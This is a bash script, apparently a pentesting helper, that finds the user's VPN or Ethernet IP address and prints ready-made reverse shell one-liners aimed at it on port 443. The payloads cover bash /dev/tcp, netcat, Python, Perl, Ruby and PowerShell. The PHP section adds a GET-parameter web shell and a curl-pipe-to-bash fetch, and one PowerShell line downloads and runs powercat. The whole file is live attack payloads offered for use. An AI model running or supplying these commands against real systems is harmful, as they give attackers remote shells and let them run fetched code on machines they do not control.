#!/bin/bash

# display reverse shell commands base on the current IP address

Frame='\033[0;32m'   # Green
Link='\033[0;35m'  	 # Purple
Title='\033[1;33m' 	 # Bold Yellow
Comment='\033[0;36m' # Cyan
End='\033[0m'		 # No Color
Point='\033[0;31m[*]\033[0m'

port=443
ip=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1) 2>/dev/null

if [ "$ip" == "" ]; then
	ip=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
fi

echo -e "${Frame}###${End} ${Title}Reference${End} ${Frame}###${End}"
echo -e "${Link}https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md${End}"
echo -e ""


echo -e "${Frame}###${End} ${Title}Bash${End} ${Frame}###${End}"
echo -e "${Point} bash >& /dev/tcp/$ip/$port 0>&1"
echo -e "${Point} bash -i >& /dev/tcp/$ip/$port 0>&1"
echo -e "${Point} bash -c \"bash -i >& /dev/tcp/$ip/$port 0>&1\" ${Comment}# wrapped${End}"
echo -e ""


echo -e "${Frame}###${End} ${Title}PHP${End} ${Frame}###${End}"
echo -e "${Point} php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
echo -e "${Point} <?php echo shell_exec(\$_GET['cmd']); ?> ${Comment}# script${End}"
echo -e "${Point} <?php system(\"curl http://$ip:9000/revshell.sh | bash\"); ?> ${Comment}# script${End}"
echo -e "${Point} <?php \$sock=fsockopen(\"$ip\",$port);\$proc=proc_open(\"/bin/sh -i\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes); ?> ${Comment}# script${End}"
# echo -e "${Point} <?php echo shell_exec(\"bash -i >& /dev/tcp/$ip/$port 0>&1\");?>"
# echo -e "${Point} php -r '\$sock=fsockopen(\"$ip\",$port);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
# echo -e "${Point} php -r '\$sock=fsockopen(\"$ip\",$port);system(\"/bin/sh -i <&3 >&3 2>&3\");'"
# echo -e "${Point} php -r '\$sock=fsockopen(\"$ip\",$port);passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"
# echo -e "${Point} php -r '\$sock=fsockopen(\"$ip\",$port);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'"
echo -e ""


echo -e "${Frame}###${End} ${Title}Netcat${End} ${Frame}###${End}"
echo -e "${Point} nc -nv $ip $port -e /bin/bash"
echo -e "${Point} rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $ip $port > /tmp/f"
echo -e ""


echo -e "${Frame}###${End} ${Title}Python${End} ${Frame}###${End}"
echo -e "${Point} python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
echo -e ""


echo -e "${Frame}###${End} ${Title}Perl${End} ${Frame}###${End}"
echo -e "${Point} perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
echo -e ""


echo -e "${Frame}###${End} ${Title}Ruby${End} ${Frame}###${End}"
echo -e "${Point} ruby -rsocket -e 'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
echo -e "" 


echo -e "${Frame}###${End} ${Title}PowerShell${End} ${Frame}###${End}"
echo -e "${Point} Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://$ip/powercat.ps1');powercat -c $ip -p $port -e cmd ${Comment}# require file transfer${End}"
echo -e "${Point} Powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
echo -e ""
